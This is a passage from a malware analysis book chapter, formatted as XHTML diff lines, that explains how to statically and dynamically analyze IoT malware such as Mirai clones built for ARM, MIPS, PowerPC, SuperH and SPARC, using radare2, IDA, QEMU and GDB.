+				<li><strong class="bold">Hajime</strong> (~2017): Another <a id="_idIndexMarker1781"/>owner of a Japanese name (meaning <em class="italic">the beginning</em>), it contains a signed message stating that the author’s aim is to secure devices.</li>
+				<li><strong class="bold">BrickerBot</strong> (~2017): Surprisingly, according to the author, it was created to destroy insecure devices and this way, get<a id="_idIndexMarker1782"/> rid o<a id="_idTextAnchor1294"/><a id="_idTextAnchor1295"/><a id="_idTextAnchor1296"/>f them, eventually making the internet safer.</li>
+			</ul>
+			<p>Now, let’s talk about how to analyze samples compiled for different architectures.</p>
+			<h1 id="_idParaDest-369"><a id="_idTextAnchor1297"/>Static and dynamic analysis of RISC samples</h1>
+			<p>Generally, it is much easier to<a id="_idIndexMarker1783"/> find tools for more widespread architectures, such as x86. Still, there are plenty of options available to analyze samples that have been built for other instruction sets. As a rule of thumb, always check whether you can get the same sample compiled for an architecture you have more experience with. This way, you can save lots of time and provide a higher-quality report.</p>
+			<p>All basic tools, such as file type <a id="_idIndexMarker1784"/>detectors, as well as data carving tools, will more than likely process samples associated with most of the <a id="_idIndexMarker1785"/>architectures that currently exist. <code>radare2</code> will also handle the static analysis part in most cases, regardless of the host architecture. If the engineer has access to the physical RISC machine to run the corresponding sample, it is always possible to either debug it there using GDB (or another supported debugger) or to use<a id="_idIndexMarker1786"/> the <strong class="bold">gdbserver</strong> tool to let other debugge<a id="_idTextAnchor1298"/>rs connect to it via the network from the preferred platform:</p>
+			<div><div><img src="img/Figure_11.22_B18500.jpg" alt="Figure 11.22 – IDA processing a Mirai clone for a SPARC architecture&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.22 – IDA processing a Mirai clone for a SPARC architecture</p>
+			<p>Here is how a Mirai-like sample <a id="_idIndexMarker1787"/>can be analyzed using <code>radare2</code>:</p>
+			<div><div><img src="img/Figure_11.23_B18500.jpg" alt="Figure 11.23 – radare2 processing the same Mirai clone for the PowerPC architecture&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.23 – radare2 processing the sam<a id="_idTextAnchor1299"/>e Mirai clone for the P<a id="_idTextAnchor1300"/>owerPC architecture</p>
+			<p>Now, let’s go through the<a id="_idIndexMarker1788"/> most popular RISC architectures that are currently targeted by IoT malware in detail.</p>
+			<h2 id="_idParaDest-370"><a id="_idTextAnchor1301"/>ARM</h2>
+			<p>As time shows, all static <a id="_idIndexMarker1789"/>analysis tools aiming to support other architectures beyond x86<a id="_idIndexMarker1790"/> generally start from the 32-bit ARM, so it is generally easier to find good solutions for it. Since the 64-bit ARM was introduced more recently, support for it is still more limited. Still, besides IDA and <code>radare2</code>, tools such as Relyze, Binary Ninja, and Hopper support it as well.</p>
+			<p>However, this becomes especially relevant in terms of dynamic analysis. For example, at the moment, IDA only ships the debugging server for the 32-bit version of ARM for Linux. While it may be time-consuming to get and use the physical ARM machine to run a<a id="_idTextAnchor1302"/> sample, one of the possible solutions here is to use QEMU and run a GDB server on the x86-based machine:</p>
+			<pre>qemu-arm -g 1234 ./binary.arm</pre>
+			<p>If the sample is dynamically linked, then additional ARM libraries may need to be installed separately, for<a id="_idIndexMarker1791"/> example, using the <code>armel</code> can be used instead of <code>armhf</code> for <a id="_idIndexMarker1792"/>ARM versions older than 7) for a <a id="_idIndexMarker1793"/>32-bit ARM or <code>/usr/arm-linux-gnueabihf</code> or <code>/usr/arm-linux-gnueabi</code> for 32-bit and <code>/usr/aarch64-linux-gnu</code> for 64-bit respectively) can be provided by either using the <code>-L</code> argument or setting the <code>QEMU_LD_PREFIX</code> environment variable.</p>
+			<p>Now, it becomes possible to<a id="_idIndexMarker1794"/> attach to this sample using other debuggers, for example, <code>radare2</code> from another Terminal:</p>
+			<pre>r2 -a arm -b 32 -d gdb://127.0.0.1:1234</pre>
+			<p>IDA supports the remote GDB debugger for the ARM architecture as well:</p>
+			<div><div><img src="img/Figure_11.24_B18500.jpg" alt="Figure 11.24 – Available debuggers for the 32-bit ARM sample in IDA&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.24 – Available debuggers for the 32-bit ARM sample in IDA</p>
+			<p>GDB has to be compiled for the speci<a id="_idTextAnchor1303"/><a id="_idTextAnchor1304"/><a id="_idTextAnchor1305"/>fied target platform before it can be used to connect to this server; the<a id="_idIndexMarker1795"/> popular solution here is to use a universal <strong class="bold">gdb-multiarch</strong> tool.</p>
+			<h2 id="_idParaDest-371"><a id="_idTextAnchor1306"/>MIPS</h2>
+			<p>The MIPS architecture remains <a id="_idIndexMarker1796"/>popular nowadays, so it is no surprise that the number of tools supporting it is growing as well. While Hopper and Relyze don’t support it at<a id="_idIndexMarker1797"/> the moment, Binary Ninja mentions it among its supported architectures. And of course, solutions such as IDA or <code>radare2</code> can also be used.</p>
+			<p>The situation becomes more complicated when it comes to dynamic analysis. For example, IDA still doesn’t provide a dedicated debugging server tool for it. Again, in this case, the engineer mainly has to rely on the QEMU emulation, with IDA’s remote GDB debugger, <code>radare2</code>, or GDB itself this time.</p>
+			<p>To connect to the GDB se<a id="_idTextAnchor1307"/>rver using GDB itself, the following command needs to be used once <a id="_idTextAnchor1308"/>it’s been started:</p>
+			<pre>target remote 127.0.0.1:1234 file &lt;path_to_executable&gt;</pre>
+			<p>Once connected, it becomes possible to start analyzing the sample.</p>
+			<h2 id="_idParaDest-372"><a id="_idTextAnchor1309"/>PowerPC</h2>
+			<p>As with the previous two <a id="_idIndexMarker1798"/>cases, s<a id="_idTextAnchor1310"/>tatic analysis is not a big problem here, as multiple<a id="_idIndexMarker1799"/> tools support PPC architecture, for example, <code>radare2</code>, IDA, Binary Ninja, ODA, or Hopper. In terms of dynamic analysis, the combination of QEMU and either IDA or GDB should do the trick: </p>
+			<div><div><img src="img/Figure_11.25_B18500.jpg" alt="Figure 11.25 – Debugging Mirai for PowerPC in IDA on Windows via a QEMU GDB server on x86&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.25 – Debugging Mirai for PowerPC in IDA on Windows via <a id="_idTextAnchor1311"/><a id="_idTextAnchor1312"/><a id="_idTextAnchor1313"/>a QEMU GDB server on x86</p>
+			<p>As we can see, less <a id="_idIndexMarker1800"/>prevalent architectures may require a more sophisticated setup<a id="_idIndexMarker1801"/> to perform comfortable debugging.</p>
+			<h2 id="_idParaDest-373"><a id="_idTextAnchor1314"/>SuperH</h2>
+			<p>SuperH (also known as Renesas SH) is the <a id="_idIndexMarker1802"/>collective name of several<a id="_idIndexMarker1803"/> instruction sets (as in, SH-1, SH-2, SH-2A, etc.), so it makes sense to double-check exactly which one needs to<a id="_idIndexMarker1804"/> be emulated. Most samples should work just fine on the SH4, as these CPU cores are supposed to be upward-compatible. This architecture is not the top choice for either attackers or reverse engineers, so the range of available tools may be more limited. For static analysis, it makes sense to stick to solutions such as <code>radare2</code>, IDA, or ODA. Since <a id="_idIndexMarker1805"/>IDA doesn’t seem to provide remote GDB debugger functionality for this architecture, dynamic analysis has to be<a id="_idIndexMarker1806"/> handled through QEMU and either <code>radare2</code> or GDB, the same way that we described earlier:</p>
+			<div><div><img src="img/Figure_11.26_B18500.jpg" alt="Figure 11.26 – Debugging Mirai for SuperH on the x86 VM using radare2 and QEMU&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.26 – Debugging Mirai for SuperH on the x86 VM using radare2 and QEMU</p>
+			<p>If for some reason, the <a id="_idIndexMarker1807"/>binary emulation doe<a id="_idTextAnchor1315"/><a id="_idTextAnchor1316"/><a id="_idTextAnchor1317"/>sn’t work properly, then it may make sense to obtain real hardware and perform debugging either there or remotely using the GDB server functionality.</p>
+			<h2 id="_idParaDest-374"><a id="_idTextAnchor1318"/>SPARC</h2>
+			<p>The SPARC design was<a id="_idIndexMarker1808"/> terminated by Oracle in 2017, but there are still lots of devices that <a id="_idIndexMarker1809"/>implement it. The number of static analysis tools supporting it is quite limited, so it makes sense to mainly use universal solutions such as ODA, <code>radare2</code>, Ghidra, and IDA. For dynamic analysis, QEMU can be used with GDB the same way that we described previously, as it looks as though neither <code>radare2</code> nor IDA supports a GDB debugger for this architecture at the moment:</p>
+			<div><div><img src="img/Figure_11.27_B18500.jpg" alt="Figure 11.27 – Debugging a Mirai sample for SPARC on the x86 VM using GDB with TUI and QEMU&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.27 – Debugging a <a id="_idTextAnchor1319"/>Mirai sample for SPARC on the x86 VM using GDB with TUI and QEMU</p>
+			<p>Various GDB-syntax-highlighting <a id="_idIndexMarker1810"/>tools can be used to make the debugging process more enjoyable.</p>
+			<p>Now, you know how to<a id="_idIndexMarker1811"/> deal with the most common archi<a id="_idTextAnchor1320"/>tectures targeted by IoT malware families. In the following section, we will talk about what to do if you have to deal with something not covered here.</p>
+			<h1 id="_idParaDest-375"><a id="_idTextAnchor1321"/>Handling other architectures</h1>
+			<p>What happens if you have to<a id="_idIndexMarker1812"/> analyze a sample that doesn’t belong to any of the architectures mentioned at some stage? There are many other options available at the moment and more will very likely appear in the future. As long as there is a meaningful amount of devices (or these devices are of particular potential interest to attackers), and especially if it is pretty straightforward to add support for them, sooner or later, <a id="_idTextAnchor1322"/>the new malwar<a id="_idTextAnchor1323"/>e family exploiting their functionality may appear. In this section, we will provide guidelines on how to handle malware for virtually any architecture.</p>
+			<h2 id="_idParaDest-376"><a id="_idTextAnchor1324"/>What to start from</h2>
+			<p>At first, identify the exact architecture of the sample; for this purpose, open source tools such as <code>file</code> will work perfectly. Next, check whether this architecture is supported by the most popular reverse engineering tools for static and dynamic analysis. IDA, Ghidra, <code>radare2</code>, and GDB are probably the best candidates for this task because of an impressive number of architectures supported, very high-quality output, and, in some cases, the ability to perform both static and dynamic analysis in one place:</p>
+			<div><div><img src="img/Figure_11.28_B18500.jpg" alt="Figure 11.28 – The radare2 main page describing the argument to specify the architecture&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 11.28 – The radare2 main page describing the argument to specify the architecture</p>
+			<p>The ability to debug may drastically speed up the analysis, so it makes sense to check whether it is possible to make the corresponding setup for the required architecture. This may involve running a sample on the physical machine or an emulator such as QEMU and connecting to it locally or remotely. Check for native architecture debugging tools; is it GDB or maybe something else? Some engineers prefer to use more high-end tools such as IDA with GDB together but separately (so, debug only specific blocks using GDB and keep the markup knowledge base in IDA).</p>
+			<p>When you get access to the disassembly, check which entity currently administrates this architecture. Then, find the official documentation describing the architecture on their website, particularly the parts describing registers, groups, and syntax for the supported instructions. Generally, the more time you have available to familiarize yourself with the nuances, the less time you will spend later on analysis.</p>
+			<p>Finally, never be ashamed to run a quick search for unique strings that have been extracted from the<a id="_idIndexMarker1813"/> sample on the internet, as there is alwa<a id="_idTextAnchor1325"/>ys a chance that someone else has already encountered and analyzed it. In addition, the same sample may be available for a more widespread architecture.</p>
+			<h1 id="_idParaDest-377"><a id="_idTextAnchor1326"/>Summary</h1>
+			<p>In this chapter, we became familiar with malware targeting non-Windows systems such as Linux that commonly power IoT devices. Firstly, we went through the basics of the ELF structure and covered syscalls. We described the general malware behavior patterns shared across multiple platforms, went through some of the most prevalent examples, and covered the common tools and techniques used in static and dynamic analysis.</p>
+			<p>Then, we took a look at the Mirai malware and put our newly obtained knowledge into practice by using it as an example and coming to understand various aspects of its behavior. Finally, we summarized the techniques that are used in static and dynamic analysis for the malware targeting the most common RISC platforms and beyond. By this point, you should have enough fundamental knowledge to start analyzing malware related to virtually any common architecture.</p>
+			<p>In <a href="B18500_12.xhtml#_idTextAnchor1327"><em class="italic">Chapter 12</em></a>, <em class="italic">Introduction to macOS and iOS Threats</em>, we will cover the malware that targets Apple systems, as this has become increasingly common nowadays.</p>
+		</div>
+		<div><div></div>
+		</div>
+	</body></html>
